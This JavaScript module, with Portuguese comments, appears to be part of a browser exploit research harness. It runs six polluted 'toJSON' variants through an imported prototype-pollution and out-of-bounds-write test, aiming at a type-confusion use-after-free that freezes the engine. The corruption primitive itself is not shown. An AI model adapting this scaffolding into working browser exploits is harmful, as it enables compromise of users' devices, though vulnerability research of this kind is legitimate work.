// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executePPThenOOBWriteTest, globalCallCount_toJSON } from './testJsonTypeConfusionUAFSpeculative.mjs';
import { toHex } from '../utils.mjs'; // Importar toHex se usado nas funções toJSON

// --- DEFINIÇÕES DAS VARIANTES DA FUNÇÃO toJSON ---
// Estas funções serão passadas para executePPThenOOBWriteTest.
// Elas precisam ser autônomas ou ter suas dependências (como logS3, toHex) resolvidas.

const ppKeyConst = 'toJSON'; // Constante para ppKey, FNAME pode ser genérico

// Variante 1: Lógica "v2 - Refinado Congelante" (baseada na sua descrição e no script inicial que congelava)
function toJSON_Variant1_FullRefined() {
    globalCallCount_toJSON++;
    const currentOperationThis = this;
    const FNAME_toJSON = `toJSON_V1_Full(Call ${globalCallCount_toJSON})`;

    // Log mínimo para reduzir interferência, mas manter observabilidade se entrar
    if (globalCallCount_toJSON <= 2) { // Logar apenas as primeiras X chamadas
      logS3(`[${ppKeyConst} Poluído - V1] ${FNAME_toJSON} Chamado! typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, "vuln");
    }

    let details = { byteLength: "N/A", first_dword: "N/A", slice_exists: "N/A" };
    try {
        details.byteLength = currentOperationThis.byteLength;
        if (currentOperationThis && typeof currentOperationThis.byteLength === 'number' && currentOperationThis.byteLength >= 4 && (currentOperationThis instanceof ArrayBuffer || (currentOperationThis.buffer instanceof ArrayBuffer && currentOperationThis.byteOffset !== undefined))) {
            let bufferToView = (currentOperationThis instanceof ArrayBuffer) ? currentOperationThis : currentOperationThis.buffer;
            let offsetInView = (currentOperationThis instanceof ArrayBuffer) ? 0 : currentOperationThis.byteOffset;
            if (bufferToView.byteLength >= offsetInView + 4) {
               details.first_dword = new DataView(bufferToView, offsetInView, 4).getUint32(0, true);
            }
        }
        details.slice_exists = (typeof currentOperationThis.slice === 'function');
        // Não logar detalhes internos aqui para minimizar o output se o congelamento for o foco
        return { toJSON_executed_V1: true, type: Object.prototype.toString.call(currentOperationThis), details_byteLength: details.byteLength };
    } catch (e) {
        logS3(`  [${ppKeyConst} Poluído - V1] ${FNAME_toJSON} ERRO ao acessar props: ${e.message}`, "critical");
        return { toJSON_error_V1: true, message: e.message };
    }
}

// Variante 2: Sem new DataView / first_dword
function toJSON_Variant2_NoDataView() {
    globalCallCount_toJSON++;
    const currentOperationThis = this;
    const FNAME_toJSON = `toJSON_V2_NoDataView(Call ${globalCallCount_toJSON})`;
    if (globalCallCount_toJSON <= 2) {
      logS3(`[${ppKeyConst} Poluído - V2] ${FNAME_toJSON} Chamado! typeof this: ${typeof currentOperationThis}`, "vuln");
    }
    try {
        let details = { byteLength: currentOperationThis.byteLength, slice_exists: (typeof currentOperationThis.slice === 'function') };
        return { toJSON_executed_V2: true, details_byteLength: details.byteLength };
    } catch (e) {
        logS3(`  [${ppKeyConst} Poluído - V2] ${FNAME_toJSON} ERRO: ${e.message}`, "critical");
        return { toJSON_error_V2: true, message: e.message };
    }
}

// Variante 3: Sem slice check
function toJSON_Variant3_NoSliceCheck() {
    globalCallCount_toJSON++;
    const currentOperationThis = this;
    const FNAME_toJSON = `toJSON_V3_NoSlice(Call ${globalCallCount_toJSON})`;
     if (globalCallCount_toJSON <= 2) {
      logS3(`[${ppKeyConst} Poluído - V3] ${FNAME_toJSON} Chamado! typeof this: ${typeof currentOperationThis}`, "vuln");
    }
    try {
        let details = { byteLength: currentOperationThis.byteLength };
        return { toJSON_executed_V3: true, details_byteLength: details.byteLength };
    } catch (e) {
        logS3(`  [${ppKeyConst} Poluído - V3] ${FNAME_toJSON} ERRO: ${e.message}`, "critical");
        return { toJSON_error_V3: true, message: e.message };
    }
}

// Variante 4: Sem byteLength access
function toJSON_Variant4_NoByteLength() {
    globalCallCount_toJSON++;
    const currentOperationThis = this; // Necessário para Object.keys
    const FNAME_toJSON = `toJSON_V4_NoByteLength(Call ${globalCallCount_toJSON})`;
    if (globalCallCount_toJSON <= 2) {
      logS3(`[${ppKeyConst} Poluído - V4] ${FNAME_toJSON} Chamado! typeof this: ${typeof currentOperationThis}`, "vuln");
    }
    try {
        // Apenas Object.keys para manter alguma complexidade recursiva se JSON.stringify o chamar em resultados
        const keys = Object.keys(currentOperationThis);
        return { toJSON_executed_V4: true, keys_V4: keys.length };
    } catch (e) {
        logS3(`  [${ppKeyConst} Poluído - V4] ${FNAME_toJSON} ERRO: ${e.message}`, "critical");
        return { toJSON_error_V4: true, message: e.message };
    }
}

// Variante 5: Loga entrada e retorna objeto vazio simples
function toJSON_Variant5_MinimalObject() {
    globalCallCount_toJSON++;
    const FNAME_toJSON = `toJSON_V5_MinimalObj(Call ${globalCallCount_toJSON})`;
    if (globalCallCount_toJSON <= 2) {
      logS3(`[${ppKeyConst} Poluído - V5] ${FNAME_toJSON} Chamado!`, "vuln");
    }
    return { toJSON_executed_V5: true };
}

// Variante 6: Não faz nada, retorna undefined (comportamento padrão de muitas funções)
function toJSON_Variant6_NoOp() {
    globalCallCount_toJSON++;
    const FNAME_toJSON = `toJSON_V6_NoOp(Call ${globalCallCount_toJSON})`;
     if (globalCallCount_toJSON <= 2) {
      logS3(`[${ppKeyConst} Poluído - V6] ${FNAME_toJSON} Chamado!`, "vuln");
    }
    return undefined;
}


// --- Função Principal de Teste ---
async function runIterativeToJSONSimplificationTests() {
    const FNAME_RUNNER = "runIterativeToJSONSimplificationTests";
    logS3(`==== INICIANDO Testes de Simplificação Iterativa do toJSON ====`, 'test', FNAME_RUNNER);

    const testsToRun = [
        { desc: "V1_FullRefined", func: toJSON_Variant1_FullRefined },
        { desc: "V2_NoDataView", func: toJSON_Variant2_NoDataView },
        { desc: "V3_NoSliceCheck", func: toJSON_Variant3_NoSliceCheck },
        { desc: "V4_NoByteLength", func: toJSON_Variant4_NoByteLength },
        { desc: "V5_MinimalObject", func: toJSON_Variant5_MinimalObject },
        { desc: "V6_NoOp", func: toJSON_Variant6_NoOp },
    ];

    for (const test of testsToRun) {
        logS3(`\n--- Executando com toJSON Lógica: ${test.desc} ---`, 'subtest', FNAME_RUNNER);
        await executePPThenOOBWriteTest(test.desc, test.func);
        await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa entre cada variante de toJSON
    }

    logS3(`==== Testes de Simplificação Iterativa do toJSON CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_IterativeToJSON';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Simplificação Iterativa do toJSON para Congelamento ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Simplificação toJSON";
    
    await runIterativeToJSONSimplificationTests();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Simplificação Iterativa do toJSON) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
}
